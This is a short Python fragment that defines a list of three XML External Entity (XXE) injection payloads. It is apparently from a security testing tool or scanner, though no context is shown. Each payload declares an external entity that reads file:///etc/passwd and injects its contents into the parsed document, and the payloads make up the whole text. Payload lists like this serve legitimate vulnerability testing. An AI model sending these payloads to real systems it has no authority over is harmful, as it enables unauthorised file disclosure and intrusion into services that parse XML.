XXE_PAYLOADS = [
    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>''',
    '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY sp SYSTEM "file:///etc/passwd">]><r>&sp;</r>'''
]
